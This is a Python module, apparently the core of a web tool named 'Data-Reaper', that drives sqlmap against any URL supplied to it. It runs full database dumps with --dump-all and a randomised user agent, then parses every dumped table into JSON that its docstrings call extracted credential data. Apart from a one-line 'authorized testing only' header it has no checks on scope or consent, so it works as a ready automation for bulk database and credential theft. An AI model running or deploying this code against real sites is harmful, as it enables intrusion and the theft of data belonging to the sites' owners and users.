#!/usr/bin/env python3
"""
Core Audit Engine — Data-Reaper Module
Handles sqlmap subprocess, threading, and CSV credential parsing.
WARNING: For authorized security testing only.
"""

import subprocess
import threading
import shutil
import time
import re
import os
import csv
import tempfile
from datetime import datetime


class AuditManager:
    """
    Manages sqlmap audit sessions with full database extraction.
    """

    def __init__(self):
        self.current_process = None
        self.output_buffer = []
        self.status = "IDLE"
        self.target_url = None
        self.start_time = None
        self.end_time = None
        self.lock = threading.Lock()
        self.output_lock = threading.Lock()
        self._stop_requested = False
        self.output_dir = None
        self.extracted_data = []

    def check_sqlmap(self):
        """Check if sqlmap is installed and available in PATH."""
        return shutil.which("sqlmap") is not None

    def _parse_output_line(self, line):
        """
        Parse a line of sqlmap output to determine status and color coding.
        Returns: (cleaned_line, line_type)
        """
        line = line.strip()
        if not line:
            return None, 'normal'

        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        clean_line = ansi_escape.sub('', line)

        lower_line = clean_line.lower()

        if any(kw in lower_line for kw in ['critical', 'unhandled exception', 'traceback']):
            return clean_line, 'critical'
        elif any(kw in lower_line for kw in ['error', 'failed', 'unable to']):
            return clean_line, 'error'
        elif any(kw in lower_line for kw in ['available databases', 'database:', 'table:', 'column:', 'dumped']):
            return clean_line, 'success'
        elif any(kw in lower_line for kw in ['warning', 'deprecated']):
            return clean_line, 'warning'
        elif any(kw in lower_line for kw in ['info', '[*]']):
            return clean_line, 'info'
        elif 'vulnerable' in lower_line and 'not' not in lower_line:
            return clean_line, 'success'
        elif 'not vulnerable' in lower_line:
            return clean_line, 'error'
        else:
            return clean_line, 'normal'

    def _update_status_from_output(self, line, line_type):
        """Update internal status based on output analysis."""
        lower_line = line.lower()

        with self.lock:
            if line_type == 'critical':
                self.status = "ERROR"
            elif 'available databases' in lower_line:
                self.status = "VULNERABLE"
            elif 'not vulnerable' in lower_line or 'not injectable' in lower_line:
                if self.status == "SCANNING":
                    self.status = "NOT_VULNERABLE"
            elif 'vulnerable' in lower_line and 'not' not in lower_line:
                self.status = "VULNERABLE"

    def _read_output_stream(self, stream, stream_name):
        """Read from stdout/stderr stream in a separate thread."""
        try:
            for raw_line in iter(stream.readline, b''):
                if self._stop_requested:
                    break

                try:
                    line = raw_line.decode('utf-8', errors='replace')
                except Exception:
                    line = str(raw_line)

                clean_line, line_type = self._parse_output_line(line)

                if clean_line:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    entry = {
                        'timestamp': timestamp,
                        'text': clean_line,
                        'type': line_type,
                        'stream': stream_name
                    }

                    with self.output_lock:
                        self.output_buffer.append(entry)
                        if len(self.output_buffer) > 1000:
                            self.output_buffer = self.output_buffer[-1000:]

                    self._update_status_from_output(clean_line, line_type)

        except Exception as e:
            timestamp = datetime.now().strftime("%H:%M:%S")
            with self.output_lock:
                self.output_buffer.append({
                    'timestamp': timestamp,
                    'text': f"[{stream_name}] Stream reader error: {str(e)}",
                    'type': 'error',
                    'stream': stream_name
                })
        finally:
            stream.close()

    def _parse_dumped_data(self):
        """
        Scan sqlmap output directory for dumped CSV files and parse into JSON.
        Returns: [{"table_name": "db.table", "rows": [{...}, ...]}, ...]
        """
        if not self.output_dir or not os.path.exists(self.output_dir):
            return []

        extracted = []

        try:
            for root, dirs, files in os.walk(self.output_dir):
                # sqlmap structure: <output_dir>/<target>/dump/<database>/<table>.csv
                if os.path.basename(root) == "dump":
                    for db_name in dirs:
                        db_path = os.path.join(root, db_name)
                        if not os.path.isdir(db_path):
                            continue
                        for fname in os.listdir(db_path):
                            if fname.endswith('.csv'):
                                table_name = fname[:-4]
                                full_name = f"{db_name}.{table_name}"
                                csv_path = os.path.join(db_path, fname)
                                try:
                                    with open(csv_path, 'r', encoding='utf-8', errors='replace') as f:
                                        reader = csv.DictReader(f)
                                        rows = list(reader)
                                        if rows:
                                            extracted.append({
                                                "table_name": full_name,
                                                "rows": rows
                                            })
                                except Exception:
                                    continue
                    # Stop recursing into dump subdirectories
                    dirs[:] = []
        except Exception as e:
            with self.output_lock:
                self.output_buffer.append({
                    'timestamp': datetime.now().strftime("%H:%M:%S"),
                    'text': f"[!] Data parsing error: {str(e)}",
                    'type': 'error',
                    'stream': 'system'
                })

        return extracted

    def _run_audit(self, target_url):
        """Internal method that runs sqlmap in a subprocess with full dump."""
        if not self.check_sqlmap():
            with self.output_lock:
                self.output_buffer.append({
                    'timestamp': datetime.now().strftime("%H:%M:%S"),
                    'text': "[!] ERROR: sqlmap not found in PATH. Install with: sudo apt install sqlmap",
                    'type': 'critical',
                    'stream': 'system'
                })
            with self.lock:
                self.status = "ERROR"
            return

        # Dedicated output directory so we can locate dumped CSVs deterministically
        self.output_dir = tempfile.mkdtemp(prefix="vulnaudit_")

        cmd = [
            "sqlmap",
            "-u", target_url,
            "--batch",
            "--dump-all",
            "--threads=5",
            "--random-agent",
            "--color=off",
            "--flush-session",
            f"--output-dir={self.output_dir}"
        ]

        timestamp = datetime.now().strftime("%H:%M:%S")
        with self.output_lock:
            self.output_buffer.append({
                'timestamp': timestamp,
                'text': f"[*] Starting sqlmap audit against: {target_url}",
                'type': 'info',
                'stream': 'system'
            })
            self.output_buffer.append({
                'timestamp': timestamp,
                'text': f"[*] Dump output: {self.output_dir}",
                'type': 'info',
                'stream': 'system'
            })
            self.output_buffer.append({
                'timestamp': timestamp,
                'text': f"[*] Command: {' '.join(cmd)}",
                'type': 'info',
                'stream': 'system'
            })

        try:
            self.current_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=1,
                universal_newlines=False
            )

            stdout_thread = threading.Thread(
                target=self._read_output_stream,
                args=(self.current_process.stdout, 'stdout'),
                daemon=True
            )
            stderr_thread = threading.Thread(
                target=self._read_output_stream,
                args=(self.current_process.stderr, 'stderr'),
                daemon=True
            )

            stdout_thread.start()
            stderr_thread.start()

            return_code = self.current_process.wait()

            stdout_thread.join(timeout=2)
            stderr_thread.join(timeout=2)

            # Parse dumped CSV files into structured JSON
            self.extracted_data = self._parse_dumped_data()

            if self.extracted_data:
                with self.output_lock:
                    self.output_buffer.append({
                        'timestamp': datetime.now().strftime("%H:%M:%S"),
                        'text': f"[*] Extracted {len(self.extracted_data)} tables from target database.",
                        'type': 'success',
                        'stream': 'system'
                    })

            with self.lock:
                if self._stop_requested:
                    final_msg = "[*] Audit stopped by user."
                elif return_code == 0:
                    if self.status == "SCANNING":
                        self.status = "COMPLETED"
                    final_msg = f"[*] Audit completed (exit code: {return_code})."
                else:
                    if self.status not in ["VULNERABLE", "NOT_VULNERABLE"]:
                        self.status = "ERROR"
                    final_msg = f"[*] Audit finished with exit code: {return_code}"

            with self.output_lock:
                self.output_buffer.append({
                    'timestamp': datetime.now().strftime("%H:%M:%S"),
                    'text': final_msg,
                    'type': 'info',
                    'stream': 'system'
                })

        except FileNotFoundError:
            with self.output_lock:
                self.output_buffer.append({
                    'timestamp': datetime.now().strftime("%H:%M:%S"),
                    'text': "[!] ERROR: sqlmap binary not found. Is it installed?",
                    'type': 'critical',
                    'stream': 'system'
                })
            with self.lock:
                self.status = "ERROR"

        except Exception as e:
            with self.output_lock:
                self.output_buffer.append({
                    'timestamp': datetime.now().strftime("%H:%M:%S"),
                    'text': f"[!] ERROR: {str(e)}",
                    'type': 'critical',
                    'stream': 'system'
                })
            with self.lock:
                self.status = "ERROR"

        finally:
            self.end_time = datetime.now().isoformat()
            self.current_process = None

    def start_audit(self, target_url):
        """Start a new audit session."""
        with self.lock:
            if self.status == "SCANNING":
                return {
                    'success': False,
                    'error': 'An audit is already running. Stop it first or wait for completion.'
                }

            self.status = "SCANNING"
            self.target_url = target_url
            self.start_time = datetime.now().isoformat()
            self.end_time = None
            self._stop_requested = False
            self.output_buffer = []
            self.extracted_data = []
            self.output_dir = None

        audit_thread = threading.Thread(
            target=self._run_audit,
            args=(target_url,),
            daemon=True
        )
        audit_thread.start()

        return {
            'success': True,
            'message': f'Audit started for {target_url}',
            'status': 'SCANNING'
        }

    def stop_audit(self):
        """Stop the currently running audit."""
        with self.lock:
            if self.status != "SCANNING" or self.current_process is None:
                return {
                    'success': False,
                    'error': 'No audit is currently running.'
                }

            self._stop_requested = True

            try:
                if self.current_process:
                    self.current_process.terminate()
                    time.sleep(0.5)
                    if self.current_process and self.current_process.poll() is None:
                        self.current_process.kill()
            except Exception as e:
                return {
                    'success': False,
                    'error': f'Error stopping audit: {str(e)}'
                }

            self.status = "IDLE"
            self.end_time = datetime.now().isoformat()

            return {
                'success': True,
                'message': 'Audit stopped.'
            }

    def get_status(self):
        """Get current audit status, output buffer, and extracted credential data."""
        with self.lock:
            status = self.status
            target = self.target_url
            start = self.start_time
            end = self.end_time
            extracted = list(self.extracted_data)

        with self.output_lock:
            output = list(self.output_buffer)

        return {
            'status': status,
            'target_url': target,
            'start_time': start,
            'end_time': end,
            'output': output,
            'extracted_data': extracted,
            'sqlmap_available': self.check_sqlmap()
        }